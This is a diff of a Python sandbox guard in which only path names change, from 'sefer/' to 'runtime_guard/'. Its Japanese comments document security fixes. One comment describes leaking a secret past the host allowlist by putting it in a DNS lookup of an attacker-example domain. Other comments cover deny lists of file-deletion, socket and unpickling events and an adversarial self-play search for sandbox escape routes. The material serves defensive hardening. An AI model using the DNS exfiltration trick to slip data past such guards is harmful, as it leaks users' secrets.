@@ -20,7 +20,7 @@ def _log_violation_to_chain(event: str, details: dict):
     # [脆弱性修正 2026-10] 以前はここに独自のSHA-256ハッシュ連鎖の実装を
     # 直接持っていたが、これは秘密鍵を用いない単純なハッシュ連鎖に過ぎず、
     # ファイルへの書き込み権限を持つ攻撃者が改ざんを検知されずに行えて
-    # しまう脆弱性があった(sefer/audit_chain.py のSignedAuditChainクラスの
+    # しまう脆弱性があった(runtime_guard/audit_chain.py のSignedAuditChainクラスの
     # docstring、GRIMOIRE.md §AE参照)。また、本関数とSignedAuditChainとで
     # 同じフォーマットのハッシュ連鎖ロジックが二重実装されており、片方だけ
     # 修正すると両者が食い違って`verify_integrity()`が壊れるリスクもあった。
@@ -33,7 +33,7 @@ def _log_violation_to_chain(event: str, details: dict):
         from audit_chain import SignedAuditChain
     truncated_details = {k: str(v)[:200] for k, v in details.items()}
     try:
-        SignedAuditChain(log_path="sefer/audit_chain.jsonl").record(event, truncated_details)
+        SignedAuditChain(log_path="runtime_guard/audit_chain.jsonl").record(event, truncated_details)
     except Exception:
         pass
 
@@ -158,7 +158,7 @@ _HARD_DENY_EVENTS = {
 # [脆弱性修正 2026-10 §BJ] `_michael_absolute_defense`の2(ソケット検査)・
 # 4(デフォルト拒否)は、以下のイベント名を常に無条件で通過させる
 # (`pass`してこのブロック自体を`return`で抜ける)。これらは
-# `sefer/raziel_ledger.json`(Razielの台帳、Armageddonの自己対戦が発見し
+# `runtime_guard/raziel_ledger.json`(Razielの台帳、Armageddonの自己対戦が発見し
 # 人間が承認した新しい禁止イベントを反映する動的な仕組み)がどれだけ
 # "banned_events"に含めても、本関数の5(Razielの台帳の enforcement)自体に
 # 到達する前に必ずこの時点で無条件に許可されて`return`するため、*絶対に*
@@ -200,13 +200,13 @@ VALID_EVENT_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(\.[A-Za-z_][A-Za-z0-9
 
 # [脆弱性修正 2026-10] `adversarial_training/local_only_selfplay_gate.py`(旧名`tartarus/armageddon.py`、Lucifer vs Sefer自己対戦)が
 # 発見し、`tools/promote_ledger_seal.py`で人間が明示的に承認した新たな禁止
-# イベント(`sefer/raziel_ledger.json`の`banned_events`)は、これまで
+# イベント(`runtime_guard/raziel_ledger.json`の`banned_events`)は、これまで
 # `_michael_absolute_defense`から一切読み込まれておらず、承認してもシステム
 # の実際の防御には何ら反映されない「学習したつもりになっているだけ」の状態
 # だった(`angels/audit_ledger_schema.py`はファイルのスキーマ検証のみで、実際に
 # 読み込まれ enforce されているかは検証していなかった)。
 #
-# [設計上の制約・安全性の確認] 本番の`sefer/raziel_ledger.json`には既定で
+# [設計上の制約・安全性の確認] 本番の`runtime_guard/raziel_ledger.json`には既定で
 # "os.remove"・"os.rmdir"・"os.rename"・"socket.connect"のように、Michael
 # が既に個別の条件付きチェック(allowed_dirs/allowed_hosts。下記の各`return`
 # 文)で扱っているイベント名が含まれている。これらを本関数の先頭で無条件の
@@ -222,7 +222,7 @@ VALID_EVENT_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(\.[A-Za-z_][A-Za-z0-9
 # 使い、audit hookの頻繁な呼び出しごとに毎回ファイルを読み直すことによる
 # 性能劣化を避けつつ、人間の承認がプロセス再起動不要で即座に反映されるよう
 # にする。
-_RAZIEL_LEDGER_PATH = Path("sefer/raziel_ledger.json")
+_RAZIEL_LEDGER_PATH = Path("runtime_guard/raziel_ledger.json")
 _dynamic_banned_events_cache = {"mtime": None, "events": frozenset()}
 
 
@@ -289,7 +289,7 @@ def _michael_absolute_defense(event: str, args: tuple):
         # `connect`/`send`/`sendall`等、接続後の経路のみを対象としており、
         # 名前解決そのものは一度もチェックされていなかった。
         #
-        # 実機で、`sefer.Sanctum(allowed_hosts={"approved.example.com"})`
+        # 実機で、`runtime_guard.Sanctum(allowed_hosts={"approved.example.com"})`
         # の内側から、許可されていないホスト名
         # (`f"{secret}.attacker-exfil-example.com"`)で`socket.getaddrinfo`
         # を呼び出したところ、`LossOfAtaraxia`は一切発生せず、このサンド
@@ -434,7 +434,7 @@ def _michael_absolute_defense(event: str, args: tuple):
             return
 
         # 5. [脆弱性修正 2026-10] Armageddonの自己対戦が発見し、人間が承認した
-        # 未知の脱走経路(sefer/raziel_ledger.json)を、ここで初めて enforce する。
+        # 未知の脱走経路(runtime_guard/raziel_ledger.json)を、ここで初めて enforce する。
         # 上記1〜4のいずれかで既に`return`済みのイベント(os.remove等、既存の
         # 条件付きチェックで処理されるもの)はこの行に到達しないため、既存の
         # allowed_dirs/allowed_hosts に基づく挙動は変わらない。ここに到達する
@@ -469,7 +469,7 @@ def _load_dynamic_shield_rules() -> tuple:
     読み込まれておらず、承認してもシステムの実際の検閲には何ら反映されない
     「学習したつもりになっているだけ」の状態だった(`angels/guard_shield_rule_autoapply_and_key_leak.py`
     は承認ワークフロー自体の構造検証のみで、実際にenforceされているかは
-    検証していなかった。`sefer/raziel_ledger.json`がMichael側から一切
+    検証していなかった。`runtime_guard/raziel_ledger.json`がMichael側から一切
     読まれていなかった件と同種の欠陥。本ファイル内の対になる修正も参照)。
 
     [安全な適用方法] `blocked_functions`(例: "loads", "load", "Unpickler")を
